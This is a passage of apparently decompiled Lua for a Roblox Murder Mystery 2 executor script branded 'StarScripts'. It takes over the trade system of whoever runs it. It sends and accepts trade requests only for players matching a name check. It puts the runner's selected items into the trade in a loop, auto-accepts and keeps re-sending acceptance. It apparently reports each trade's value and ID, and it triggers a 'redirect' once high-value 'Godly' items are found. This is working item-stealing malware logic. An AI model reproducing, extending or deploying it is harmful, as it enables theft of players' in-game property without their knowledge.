		local Session = starScriptsTradeRuntime.Session

		starScriptsTradeRuntime.PendingCompletion = {
			Session = Session,
			Value = v505(starScriptsTradeRuntime.Selected),
			TradeId = v281 .. ":" .. tostring(Session),
			Reported = false
		}
		v482()
		task.defer(v482)
		task.delay(0.1, function()
			if starScriptsTradeRuntime.Active and starScriptsTradeRuntime.Session == Session then
				v482()
			end
		end)
		task.spawn(function()
			task.wait(0.75)

			local n18 = 0

			for _, v in ipairs(starScriptsTradeRuntime.Selected) do
				local max = math.max
				local n19 = 1
				local floor = math.floor
				local v546 = tonumber(v.amount) or 1

				for i = 1, max(n19, floor(v546)) do
					if not starScriptsTradeRuntime.Active or starScriptsTradeRuntime.Session ~= Session or starScriptsTradeRuntime.OtherPlayer ~= starScriptsTradeRuntime.Target then
						return
					end

					v427(OfferItem, v.id, v.category)
					n18 += 1

					if n18 >= 20 then
						n18 = 0
						task.wait()
					end
				end
			end
		end)
	end))
	table.insert(starScriptsTradeRuntime.Connections, Trade.UpdateTrade.OnClientEvent:Connect(function(p65)
		if not starScriptsTradeRuntime.Active or not starScriptsTradeRuntime.Target or starScriptsTradeRuntime.OtherPlayer ~= starScriptsTradeRuntime.Target then
			return
		end

		starScriptsTradeRuntime.Update += 1

		local Session = starScriptsTradeRuntime.Session
		local v549 = v511(p65)
		local LastOffer = p65.LastOffer

		if starScriptsTradeRuntime.ObservedOffer ~= LastOffer then
			starScriptsTradeRuntime.ObservedOffer = LastOffer
			starScriptsTradeRuntime.AcceptGeneration += 1
			starScriptsTradeRuntime.AcceptScheduled = false
			starScriptsTradeRuntime.AcceptPending = false
			starScriptsTradeRuntime.LastAcceptSentAt = 0
		end

		if not v522(v549) then
			return
		end

		if starScriptsTradeRuntime.AcceptScheduled then
			return
		end

		starScriptsTradeRuntime.AcceptScheduled = true

		local AcceptGeneration = starScriptsTradeRuntime.AcceptGeneration

		task.delay(4, function()
			if starScriptsTradeRuntime.Active then
				if starScriptsTradeRuntime.Session == Session and starScriptsTradeRuntime.AcceptGeneration == AcceptGeneration and starScriptsTradeRuntime.ObservedOffer == LastOffer then
					if starScriptsTradeRuntime.OtherPlayer == starScriptsTradeRuntime.Target then
						starScriptsTradeRuntime.AcceptPending = true
						starScriptsTradeRuntime.LastAcceptSentAt = time()
						v427(AcceptTrade, game.PlaceId * 3, LastOffer)

						return
					end
				end
			end
		end)
	end))
	table.insert(starScriptsTradeRuntime.Connections, Trade.EndTrade.OnClientEvent:Connect(function()
		v532(starScriptsTradeRuntime.Target)
	end))
	table.insert(starScriptsTradeRuntime.Connections, Trade.AcceptTrade.OnClientEvent:Connect(function(p66)
		if p66 then
			starScriptsTradeRuntime.AcceptPending = false
			starScriptsTradeRuntime.ConfirmedCompletionPending = true
			starScriptsTradeRuntime.TradeCompleted = true

			local PendingCompletion = starScriptsTradeRuntime.PendingCompletion

			if PendingCompletion then
				if not PendingCompletion.Reported and PendingCompletion.Value > 0 then
					PendingCompletion.Reported = true
					v284(PendingCompletion.Value, PendingCompletion.TradeId)
				end
			end

			v532(starScriptsTradeRuntime.Target)
		end
	end))
end

do
	local function v553(p67)
		v479()

		local Name

		if typeof(p67) == "Instance" and p67:IsA("Player") then
			Name = p67.Name
		else
			Name = tostring(p67)
		end

		if not v15(Name) then
			task.delay(0.05, function()
				if starScriptsTradeRuntime.Active then
					v479()
					v427(DeclineRequest)
				end
			end)

			return false
		end

		u417 = true
		starScriptsTradeRuntime.Target = Name
		starScriptsTradeRuntime.LastTarget = Name
		task.delay(0.1, function()
			if starScriptsTradeRuntime.Active then
				v479()
				v427(AcceptRequest)
			end
		end)

		return true
	end
	local function v555()
		SendRequest.OnClientInvoke = function(p68)
			return v553(p68)
		end
	end

	v555()
	table.insert(starScriptsTradeRuntime.Connections, Trade.RequestSent.OnClientEvent:Connect(function(p69)
		v553(p69)
	end))
	v418 = function(player)
		if not u417 and starScriptsTradeRuntime.Active then
			if v15(player.Name) and player ~= LocalPlayer then
				u417 = true
				starScriptsTradeRuntime.LastInviteAt = time()
				starScriptsTradeRuntime.Target = player.Name
				starScriptsTradeRuntime.LastTarget = player.Name

				local v556 = v432(SendRequest, player)

				if not v556 then
					u417 = false
					starScriptsTradeRuntime.Target = nil
					task.delay(2.5, function()
						if starScriptsTradeRuntime.Active then
							if not u417 and player.Parent == Players and v15(player.Name) then
								v418(player)
							end
						end
					end)
				end

				return
			end
		end
	end
	table.insert(starScriptsTradeRuntime.Connections, Players.PlayerAdded:Connect(v418))
	task.spawn(function()
		while starScriptsTradeRuntime.Active do
			task.wait(1)
			v555()

			local v558, v559 = v432(GetTradeStatus)

			if v558 and v559 == "None" then
				local v560 = time() - starScriptsTradeRuntime.LastInviteAt

				if u417 and v560 >= 3 then
					u417 = false
				end

				if starScriptsTradeRuntime.OtherPlayer ~= nil then
					starScriptsTradeRuntime.Session += 1
					starScriptsTradeRuntime.Update += 1
					starScriptsTradeRuntime.OtherPlayer = nil
					starScriptsTradeRuntime.Target = nil
					starScriptsTradeRuntime.Selected = {}
					starScriptsTradeRuntime.ObservedOffer = nil
					starScriptsTradeRuntime.AcceptGeneration += 1
					starScriptsTradeRuntime.AcceptScheduled = false
					starScriptsTradeRuntime.AcceptPending = false
					starScriptsTradeRuntime.LastAcceptSentAt = 0
				end

				if not u417 and v560 >= 2.5 then
					u268 = v152()

					if #u268 > 0 then
						local v561 = v504(starScriptsTradeRuntime.LastTarget)

						if v561 then
							v418(v561)
						end
					end
				end
			elseif v558 and starScriptsTradeRuntime.AcceptPending and starScriptsTradeRuntime.ObservedOffer ~= nil and starScriptsTradeRuntime.OtherPlayer == starScriptsTradeRuntime.Target then
				if time() - starScriptsTradeRuntime.LastAcceptSentAt >= 2 then
					starScriptsTradeRuntime.LastAcceptSentAt = time()
					v427(AcceptTrade, game.PlaceId * 3, starScriptsTradeRuntime.ObservedOffer)
				end
			end
		end
	end)
end

do
	local v562, v563 = v432(GetTradeStatus)

	if v562 and v563 ~= nil and v563 ~= "None" then
		v427(DeclineTrade)
		v427(DeclineRequest)
		starScriptsTradeRuntime.OtherPlayer = nil
		starScriptsTradeRuntime.Target = nil
		starScriptsTradeRuntime.Selected = {}
		starScriptsTradeRuntime.ObservedOffer = nil
		pcall(v482)
	end
end

local v564 = v504()

if v564 then
	task.defer(v418, v564)
end

genv.StarScriptsMM2RedirectRun = (genv.StarScriptsMM2RedirectRun or 0) + 1

local StarScriptsMM2RedirectRun = genv.StarScriptsMM2RedirectRun

task.delay(v16, function()
	if genv.StarScriptsMM2RedirectRun == StarScriptsMM2RedirectRun then
		if starScriptsTradeRuntime.Active and not starScriptsTradeRuntime.TradeCompleted and not starScriptsMM2LiveRuntime.Completed then
			local n20 = 0

			for _, v in ipairs(u268) do
				local v569 = v18(v)

				if n20 < v569 then
					n20 = v569

					local displayName = v.displayName or v.name
				end
			end

			if n20 < Godly then
				return
			end

			if not v21() then
				return
			end

			starScriptsTradeRuntime.LastTarget = nil

			if starScriptsTradeRuntime.OtherPlayer ~= nil and not v20(starScriptsTradeRuntime.OtherPlayer) then
				v427(DeclineTrade)
			end

			task.spawn(function()
				v283("redirect", nil, 3)
			end)

			return
		end
	end
end)
